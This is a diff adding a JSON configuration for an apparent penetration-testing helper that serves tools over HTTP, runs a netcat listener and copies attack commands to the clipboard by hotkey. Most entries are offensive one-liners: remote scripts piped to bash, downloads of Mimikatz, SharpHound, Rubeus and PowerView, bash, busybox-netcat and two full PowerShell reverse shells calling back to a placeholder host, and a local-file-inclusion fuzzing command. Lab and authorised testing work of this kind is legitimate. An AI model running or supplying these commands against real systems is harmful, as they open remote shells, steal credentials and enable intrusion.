@@ -1,0 +1,145 @@
+{
+  "preferred_http_iface": "tun0",
+  "ip_override": null,
+  "port": 9001,
+  "auto_http": false,
+  "auto_listen": false,
+  "preferred_listener_iface": "tun0",
+  "listener_ip": null,
+  "listener_port": 4444,
+  "listener_proto": "rlwrap nc",
+  "preferred_ifaces": [
+    "tun0",
+    "wg0",
+    "tap0"
+  ],
+  "tools_base": "~/redbelt/tools",
+  "tools": {
+    "Linux": {
+      "LinPEAS": {
+        "command": "curl -s http://{IP}:{PORT}/lin/linpeas.sh | bash",
+        "nickname": "LinPEAS",
+        "hotkey": "l"
+      },
+      "pspy64": {
+        "command": "wget http://{IP}:{PORT}/lin/pspy64 && chmod +x pspy64 && ./pspy64",
+        "nickname": "pspy64",
+        "hotkey": "p"
+      },
+      "chisel": {
+        "command": "wget http://{IP}:{PORT}/lin/chisel && chmod +x chisel",
+        "nickname": "chisel",
+        "hotkey": "c"
+      }
+    },
+    "Windows": {
+      "WinPEAS x86": {
+        "command": "iwr http://{IP}:{PORT}/win/winPEASx86.exe -OutFile winpeas.exe; .\\winpeas.exe",
+        "nickname": "WinPEAS x86",
+        "hotkey": "0"
+      },
+      "WinPEAS x64": {
+        "command": "iwr http://{IP}:{PORT}/win/winPEASx64.exe -OutFile winpeas.exe; .\\winpeas.exe",
+        "nickname": "WinPEAS x64",
+        "hotkey": "w"
+      },
+      "nc.exe": {
+        "command": "iwr http://{IP}:{PORT}/win/nc.exe -OutFile nc.exe",
+        "nickname": "nc.exe",
+        "hotkey": "n"
+      },
+      "nc64.exe": {
+        "command": "iwr http://{IP}:{PORT}/win/nc64.exe -OutFile nc64.exe",
+        "nickname": "nc64.exe",
+        "hotkey": "2"
+      },
+      "chisel": {
+        "command": "iwr http://{IP}:{PORT}/win/chisel -OutFile chisel.exe",
+        "nickname": "chisel",
+        "hotkey": "c"
+      },
+      "SharpHound": {
+        "command": "iwr http://{IP}:{PORT}/win/SharpHound.ps1 -OutFile SharpHound.ps1; Import-Module .\\SharpHound.ps1; Invoke-BloodHound -c All",
+        "nickname": "SharpHound",
+        "hotkey": "s"
+      },
+      "Invoke-Rubeus": {
+        "command": "iwr http://{IP}:{PORT}/win/Invoke-Rubeus.ps1 -OutFile Invoke-Rubeus.ps1; Import-Module .\\Invoke-Rubeus.ps1",
+        "nickname": "Invoke-Rubeus",
+        "hotkey": "i"
+      },
+      "PowerView": {
+        "command": "iwr http://{IP}:{PORT}/win/PowerView.ps1 -OutFile PowerView.ps1; Import-Module .\\PowerView.ps1",
+        "nickname": "PowerView",
+        "hotkey": "p"
+      },
+      "Mimikatz": {
+        "command": "iwr http://{IP}:{PORT}/win/mimikatz.exe -OutFile mimikatz.exe; .\\mimikatz.exe",
+        "nickname": "Mimikatz",
+        "hotkey": "m"
+      }
+    },
+    "Shells": {
+      "bash -i": {
+        "command": "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
+        "nickname": "bash -i",
+        "hotkey": "i"
+      },
+      "bash -c": {
+        "command": "bash -c \"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\"",
+        "nickname": "bash -c",
+        "hotkey": "c"
+      },
+      "busybox nc": {
+        "command": "busybox nc {IP} {PORT} -e /bin/bash",
+        "nickname": "busybox nc",
+        "hotkey": "b"
+      },
+      "PowerShell 1": {
+        "command": "$LHOST = \"{IP}\"; $LPORT = {PORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
+        "nickname": "PowerShell 1",
+        "hotkey": "1"
+      },
+      "PowerShell 2": {
+        "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+        "nickname": "PowerShell 2",
+        "hotkey": "2"
+      }
+    },
+    "Web": {
+      "LFI ?f= Fuzz": {
+        "command": "ffuf \\\n-u \"http://example.com/download.php?f=FUZZ\" \\\n-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\\n-H \"Cookie: PHPSESSID=COOKIE123\" \\\n-ac",
+        "nickname": "LFI ?f= Fuzz",
+        "hotkey": "l"
+      }
+    },
+    "Misc": {}
+  },
+  "hotkey_launch": {
+    "enabled": true,
+    "leader": "<ctrl>+<alt>+<space>",
+    "timeout_ms": 5000,
+    "log_launches": true
+  },
+  "section_hotkeys": {
+    "Linux": "l",
+    "Windows": "w",
+    "Shells": "s",
+    "Web": "e",
+    "Misc": "m"
+  },
+  "start_on_login": true,
+  "notify_clipboard": true,
+  "notify_listener": true,
+  "notify_http": true,
+  "open_terminal_on_listener_connection": false,
+  "shell_stabilisation": {
+    "auto_stabilise": false,
+    "auto_identify_terminal": true,
+    "method": "auto",
+    "python_preference": "python3_first",
+    "export_term": "xterm",
+    "sync_stty_size": true,
+    "shell_path": "bash"
+  }
+}
